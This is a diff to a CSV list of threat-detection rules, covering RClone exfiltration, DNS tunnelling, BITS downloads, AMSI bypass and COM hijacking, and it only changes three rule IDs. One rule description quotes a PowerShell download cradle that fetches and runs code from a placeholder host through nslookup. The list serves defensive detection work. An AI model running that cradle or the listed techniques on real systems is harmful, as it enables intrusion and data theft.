@@ -2011,7 +2011,7 @@ A common error message is ""Node - (provided IP or default) ERROR Description =T
 "Suspicious Bitstransfer via PowerShell","medium","","process_creation","Detects transferring files from system on a server bitstransfer Powershell cmdlets","dc28bbe4-14ec-d765-8514-2ff2ff532e24"
 "RClone Execution","high","","process_creation","Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc","13dc41d6-0489-5505-887a-c3bc11ddec90"
 "New Service Creation","low","","process_creation","Detects creation of a new service.","f3c0ce89-d7e4-b1be-b79d-265254701fe6"
-"DNS Tunnel Technique from MuddyWater","critical","","process_creation","Detecting DNS tunnel activity for Muddywater actor","0f27e458-cb56-857e-1e9a-630975f5984a"
+"DNS Tunnel Technique from MuddyWater","critical","","process_creation","Detecting DNS tunnel activity for Muddywater actor","e22efaa2-ec7f-d290-fe53-4f72f4035c27"
 "Suspicious Bitsadmin Job via PowerShell","high","","process_creation","Detect download by BITS jobs via PowerShell","a6124306-bb3c-9e0e-a088-a4dee392c1ee"
 "Nslookup PwSh Download Cradle","medium","","process_creation","This rule tries to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]","79c252ba-3759-a153-7242-9f3de6ec7ba4"
 "PowerShell AMSI Bypass Pattern","high","","process_creation","Detects attempts to disable AMSI in the command line. It is possible to bypass AMSI by disabling it before loading the main payload.","9ec2c364-89c8-b572-4a96-ddc786444ecf"
@@ -2622,10 +2622,10 @@ This rule triggers when any of the following registry keys are set to DWORD 1, h
 This binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run.
 The problem is, it will run any arbitrary command without restriction of location or type.
 ","7c470022-ced9-05c4-b9fc-5aff8e5f4dce"
-"Office Security Settings Changed","high","","registry_set","Detects registry changes to Office macro settings. The TrustRecords contain information on executed macro-enabled documents. (see references)","ea79a782-319f-b5bd-9293-cab2134f5c43"
+"Office Security Settings Changed","high","","registry_set","Detects registry changes to Office macro settings. The TrustRecords contain information on executed macro-enabled documents. (see references)","380737d7-6d1c-6791-31b3-6ce6063b0c58"
 "User Account Hidden By Registry","high","","registry_set","Detect modification for a specific user to prevent that user from being listed on the logon screen","1b78376c-c1d2-a830-93b1-5dee98965490"
 "Potential Persistence Via COM Hijacking From Suspicious Locations","high","","registry_set","Detects potential COM object hijacking where the ""Server"" (In/Out) is pointing to a suspicious or unusual location.","79389718-9e14-e5e9-1cc7-2c027078bf22"
-"Service Binary in Uncommon Folder","medium","","registry_set","Detect the creation of a service with a service binary located in a uncommon directory","f9252ab9-0f85-c10d-fd51-576b83182926"
+"Service Binary in Uncommon Folder","medium","","registry_set","Detect the creation of a service with a service binary located in a uncommon directory","42daf60a-a738-58f7-79c2-3888e02ebc89"
 "Autorun Keys Modification","medium","","registry_event","Detects modification of autostart extensibility point (ASEP) in registry.","b8939982-1774-1f45-f838-7bf9ac9be3c2"
 "Disable Microsoft Office Security Features","high","","registry_set","Disable Microsoft Office Security Features by registry","d226853e-3dbf-ce71-60c1-5458858abbbc"
 "Adwind RAT / JRAT - Registry","high","","registry_set","Detects javaw.exe in AppData folder as used by Adwind / JRAT","6c44673b-8c80-9ce9-718d-46f34b17ffcc"
